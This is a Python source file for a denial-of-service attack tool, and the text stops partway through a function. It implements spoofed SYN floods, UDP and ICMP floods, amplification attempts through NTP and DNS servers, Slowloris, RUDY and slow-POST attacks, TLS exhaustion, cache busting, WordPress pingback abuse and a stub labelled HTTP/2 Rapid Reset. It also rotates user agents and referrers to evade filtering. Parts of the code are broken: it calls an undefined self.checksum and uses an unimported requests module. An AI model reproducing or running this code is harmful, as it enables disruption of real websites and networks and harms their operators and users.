import argparse
import cloudscraper
import random
import threading
import time
import socket
import dns.resolver
import asyncio
import aiohttp
import ssl
import struct
import binascii
import multiprocessing
import os
import re
import xmlrpc.client
import httplib2
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import partial

# ======================
# Configuration
# ======================

# 50 User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 15117.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Twitterbot/1.0",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod touch; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel Fold) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G715FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-F711B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-M336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-X700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-X800) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

# Other configurations
REFERRERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
    "https://www.instagram.com/",
    "https://www.pinterest.com/",
    "https://www.tumblr.com/",
    "https://www.wikipedia.org/",
    "https://www.amazon.com/",
    "https://www.ebay.com/",
    "https://www.youtube.com/",
    "https://www.twitch.tv/"
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "fr-FR,fr;q=0.9",
    "de-DE,de;q=0.9",
    "es-ES,es;q=0.9",
    "it-IT,it;q=0.9",
    "pt-BR,pt;q=0.9",
    "ru-RU,ru;q=0.9",
    "ja-JP,ja;q=0.9",
    "zh-CN,zh;q=0.9"
]

DNS_RESOLVERS = [
    "8.8.8.8",        # Google
    "8.8.4.4",        # Google
    "1.1.1.1",        # Cloudflare
    "1.0.0.1",        # Cloudflare
    "9.9.9.9",        # Quad9
    "149.112.112.112", # Quad9
    "208.67.222.222", # OpenDNS
    "208.67.220.220", # OpenDNS
    "64.6.64.6",      # Verisign
    "64.6.65.6"       # Verisign
]

# Attack-specific configurations
SLOWLORIS_INTERVAL = 10  # Seconds between headers
RUDY_INTERVAL = 5        # Seconds between chunks
SSL_EXHAUSTION_CIPHERS = [
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-SHA384',
    'ECDHE-ECDSA-AES256-SHA384',
]

# ======================
# Attack Implementations
# ======================

def get_random_headers():
    """Generate random headers for requests"""
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive' if random.random() > 0.3 else 'close',
        'Referer': random.choice(REFERRERS),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin' if random.random() > 0.7 else 'cross-site',
        'Sec-Fetch-User': '?1' if random.random() > 0.5 else None,
        'TE': 'trailers'
    }

# Network Layer Attacks
def syn_flood(target_ip, target_port, duration, counter):
    """SYN Flood attack"""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            source_port = random.randint(1024, 65535)
            
            # IP header
            ip_ver = 4
            ip_ihl = 5
            ip_tos = 0
            ip_tot_len = 40
            ip_id = random.randint(1, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_TCP
            ip_check = 0
            ip_saddr = socket.inet_aton(source_ip)
            ip_daddr = socket.inet_aton(target_ip)
            
            ip_ihl_ver = (ip_ver << 4) + ip_ihl
            ip_header = struct.pack('!BBHHHBBH4s4s', 
                                  ip_ihl_ver, ip_tos, ip_tot_len, 
                                  ip_id, ip_frag_off, ip_ttl, 
                                  ip_proto, ip_check, ip_saddr, ip_daddr)
            
            # TCP header
            tcp_source = source_port
            tcp_dest = target_port
            tcp_seq = random.randint(1, 4294967295)
            tcp_ack_seq = 0
            tcp_doff = 5
            tcp_fin = 0
            tcp_syn = 1
            tcp_rst = 0
            tcp_psh = 0
            tcp_ack = 0
            tcp_urg = 0
            tcp_window = socket.htons(5840)
            tcp_check = 0
            tcp_urg_ptr = 0
            
            tcp_offset_res = (tcp_doff << 4) + 0
            tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
            
            tcp_header = struct.pack('!HHLLBBHHH', 
                                   tcp_source, tcp_dest, 
                                   tcp_seq, tcp_ack_seq, 
                                   tcp_offset_res, tcp_flags, 
                                   tcp_window, tcp_check, tcp_urg_ptr)
            
            # Packet checksum
            source_address = socket.inet_aton(source_ip)
            dest_address = socket.inet_aton(target_ip)
            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcp_length = len(tcp_header)
            
            psh = struct.pack('!4s4sBBH', 
                             source_address, 
                             dest_address, 
                             placeholder, 
                             protocol, 
                             tcp_length)
            psh = psh + tcp_header
            
            tcp_check = socket.htons(self.checksum(psh))
            tcp_header = struct.pack('!HHLLBBH', 
                                   tcp_source, tcp_dest, 
                                   tcp_seq, tcp_ack_seq, 
                                   tcp_offset_res, tcp_flags, 
                                   tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
            
            packet = ip_header + tcp_header
            
            s.sendto(packet, (target_ip, 0))
            counter['requests'] += 1
            time.sleep(0.01)
        except:
            counter['errors'] += 1
            time.sleep(0.1)

def checksum(self, msg):
    """Calculate checksum"""
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w
    
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def udp_flood(target_ip, target_port, duration, counter):
    """UDP Flood attack"""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(os.urandom(1024), (target_ip, target_port))
            counter['requests'] += 1
            time.sleep(0.01)
        except:
            counter['errors'] += 1
            time.sleep(0.1)

def icmp_flood(target_ip, duration, counter):
    """ICMP (Ping) Flood attack"""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.sendto(binascii.unhexlify("0800000000000000"), (target_ip, 0))
            counter['requests'] += 1
            time.sleep(0.01)
        except:
            counter['errors'] += 1
            time.sleep(0.1)

def ntp_amplification(target_ip, duration, counter):
    """NTP Amplification attack"""
    end_time = time.time() + duration
    ntp_servers = ["pool.ntp.org", "time.nist.gov", "time.google.com"]
    
    while time.time() < end_time:
        try:
            ntp_server = random.choice(ntp_servers)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b'\x1b' + 47 * b'\0', (ntp_server, 123))
            counter['requests'] += 1
            time.sleep(0.1)
        except:
            counter['errors'] += 1
            time.sleep(0.5)

def dns_amplification(target_ip, duration, counter):
    """DNS Amplification attack"""
    end_time = time.time() + duration
    dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]
    
    while time.time() < end_time:
        try:
            dns_server = random.choice(dns_servers)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            query = binascii.unhexlify("AAAA01000001000000000000") + os.urandom(10) + binascii.unhexlify("0000010001")
            sock.sendto(query, (dns_server, 53))
            counter['requests'] += 1
            time.sleep(0.1)
        except:
            counter['errors'] += 1
            time.sleep(0.5)

# Application Layer Attacks
def slowloris(target_url, duration, counter):
    """Slowloris attack"""
    end_time = time.time() + duration
    parsed = urllib.parse.urlparse(target_url)
    host = parsed.netloc
    path = parsed.path if parsed.path else '/'
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, 80))
            
            # Send partial headers
            s.send(f"GET {path} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
            s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
            
            # Keep connection alive
            while time.time() < end_time:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                time.sleep(SLOWLORIS_INTERVAL)
                counter['requests'] += 1
        except:
            counter['errors'] += 1
            time.sleep(1)

def rudy_attack(target_url, duration, counter):
    """R-U-Dead-Yet (RUDY) attack"""
    end_time = time.time() + duration
    parsed = urllib.parse.urlparse(target_url)
    host = parsed.netloc
    path = parsed.path if parsed.path else '/'
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, 80))
            
            # Send POST request with slow body
            s.send(f"POST {path} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
            s.send("Content-Type: application/x-www-form-urlencoded\r\n")
            s.send("Content-Length: 1000000\r\n\r\n".encode())
            
            # Send body slowly
            while time.time() < end_time:
                s.send("a=".encode())
                time.sleep(RUDY_INTERVAL)
                s.send("b".encode())
                counter['requests'] += 1
        except:
            counter['errors'] += 1
            time.sleep(1)

def ssl_exhaustion(target_url, duration, counter):
    """SSL/TLS Exhaustion attack"""
    end_time = time.time() + duration
    parsed = urllib.parse.urlparse(target_url)
    host = parsed.netloc
    port = 443
    
    while time.time() < end_time:
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
            context.set_ciphers(':'.join(SSL_EXHAUSTION_CIPHERS))
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            ssl_sock = context.wrap_socket(s, server_hostname=host)
            ssl_sock.close()
            counter['requests'] += 1
            time.sleep(0.1)
        except:
            counter['errors'] += 1
            time.sleep(0.5)

def cache_busting(target_url, duration, counter):
    """Cache Busting Attack"""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            headers = get_random_headers()
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
            
            # Add random query parameter
            busted_url = f"{target_url}?cachebust={random.randint(1, 1000000)}"
            
            if random.random() > 0.5:
                response = requests.get(busted_url, headers=headers, timeout=10)
            else:
                response = requests.post(busted_url, headers=headers, timeout=10)
            
            counter['requests'] += 1
            if response.status_code == 200:
                counter['success'] += 1
            else:
                counter['errors'] += 1
            time.sleep(0.1)
        except:
            counter['errors'] += 1
            time.sleep(0.5)

def wordpress_pingback(target_url, duration, counter):
    """WordPress XML-RPC Pingback Attack"""
    end_time = time.time() + duration
    pingback_url = f"{target_url}/xmlrpc.php"
    
    while time.time() < end_time:
        try:
            server = xmlrpc.client.ServerProxy(pingback_url)
            result = server.pingback.ping(f"http://{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}", target_url)
            counter['requests'] += 1
            time.sleep(0.5)
        except:
            counter['errors'] += 1
            time.sleep(1)

def http2_rapid_reset(target_url, duration, counter):
    """HTTP/2 Rapid Reset Attack (CVE-2023-44487)"""
    end_time = time.time() + duration
    parsed = urllib.parse.urlparse(target_url)
    host = parsed.netloc
    path = parsed.path if parsed.path else '/'
    
    while time.time() < end_time:
        try:
            # This is a simplified version - actual implementation requires HTTP/2 knowledge
            h = httplib2.Http()
            for _ in range(100):  # Rapid requests
                resp, content = h.request(target_url, "GET", headers=get_random_headers())
                counter['requests'] += 1
            time.sleep(0.1)
        except:
            counter['errors'] += 1
            time.sleep(0.5)

def slow_post(target_url, duration, counter):
    """Slow POST Attack"""
    end_time = time.time() + duration
    parsed = urllib.parse.urlparse(target_url)
    host = parsed.netloc
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, 80))
            
            # Send headers
            s.send(f"POST {parsed.path} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send("Content-Type: application/x-www-form-urlencoded\r\n".encode())
            s.send("Content-Length: 1000000\r\n\r\n".encode())
            
            # Send body slowly
            chunk_size = 1
            total_sent = 0
            while total_sent < 1000000 and time.time() < end_time:
                s.send(b'a' * chunk_size)
                total_sent += chunk_size
                time.sleep(1)
                counter['requests'] += 1
        except:
    
